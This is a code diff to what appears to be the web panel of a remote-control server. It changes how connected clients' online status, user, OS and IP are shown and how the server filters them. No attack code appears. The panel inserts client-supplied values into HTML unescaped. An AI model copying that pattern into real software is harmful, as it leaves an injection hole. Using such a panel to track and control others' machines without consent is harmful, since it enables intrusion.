@@ -1142,20 +1142,31 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                             return;
                         }
                         
+                        // ⚡ الكود المبسط والأفضل:
                         list.innerHTML = sessions.map(client => {
-                            const isActive = (Date.now() - new Date(client.last_seen).getTime()) < 10000; // ⚡ 10 seconds
+                            const lastSeen = new Date(client.last_seen).getTime();
+                            const now = Date.now();
+                            const timeDiff = (now - lastSeen) / 1000;
+                            
+                            // 🟢 بسيط: أقل من 30 ثانية = أخضر، أكثر = أحمر
+                            const isOnline = timeDiff < 30;
+                            
+                            const statusClass = isOnline ? 'online-status' : 'online-status offline';
+                            const statusText = isOnline ? '🟢 ONLINE' : '🔴 OFFLINE';
+                            const statusColor = isOnline ? '#28a745' : '#dc3545';
+                            
                             const isSelected = client.id === currentClientId;
-                            const statusClass = isActive ? 'online-status' : 'online-status offline';
                             
                             return `
-                                <div class="session-item ${isSelected ? 'active' : ''} ${!isActive ? 'offline' : ''}" 
+                                <div class="session-item ${isSelected ? 'active' : ''} ${!isOnline ? 'offline' : ''}" 
                                      onclick="selectClient('${client.id}')">
-                                    <div class="${statusClass}"></div>
-                                    <strong style="color: ${isActive ? '#28a745' : '#dc3545'}">${client.computer || client.id}</strong><br>
+                                    <div class="${statusClass}" title="${statusText}"></div>
+                                    <strong style="color: ${statusColor}">${client.computer || client.id}</strong><br>
                                     <small>User: ${client.user || 'Unknown'}</small><br>
                                     <small>OS: ${client.os || 'Unknown'}</small><br>
                                     <small>IP: ${client.ip}</small><br>
-                                    <small>Last Active: ${new Date(client.last_seen).toLocaleTimeString()}</small>
+                                    <small>Last: ${timeDiff.toFixed(0)}s ago</small>
+                                    <small style="color: ${statusColor}; font-weight: bold;"> • ${statusText}</small>
                                 </div>
                             `;
                         }).join('');
@@ -1395,8 +1406,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 last_seen = datetime.fromisoformat(client_data['last_seen'])
                 time_diff = (current_time - last_seen).total_seconds()
             
-                if time_diff < 300:  # 5 minutes
-                    client_data['is_online'] = time_diff < 10  # ⚡ 10 seconds for online
+                if time_diff < 30:  # 0.5 minutes
+                    client_data['is_online'] = time_diff < 5  # ⚡ 5 seconds for online
                     client_data['last_seen_seconds'] = time_diff
                     active_clients.append(client_data)
                 else:
